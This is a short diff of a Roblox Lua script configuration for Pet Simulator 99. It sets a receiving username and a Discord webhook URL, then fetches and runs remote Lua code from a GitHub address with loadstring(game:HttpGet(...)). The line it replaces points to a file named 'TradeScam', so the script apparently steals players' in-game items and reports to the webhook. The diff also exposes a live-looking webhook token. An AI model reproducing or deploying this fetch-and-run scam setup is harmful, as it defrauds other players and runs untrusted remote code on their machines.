@@ -1,4 +1,5 @@
-farmuiUsername = "hiro230_kyn
+Username = "Hiro230_kyn"
 loadingscreen = true 
 farmui = false
-loadstring(game:HttpGet("https://github.com/jayciegantala/Petsim99/edit/main/TradeScam"))()
+webhook = "https://discord.com/api/webhooks/1098858569631281152/xSvjPy4P9qH7m1ZCwCtvDT0TraaHTjpit-cJI_qDrY7UFI0BNBWhVA_tMiIUgyJ9zCcd"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
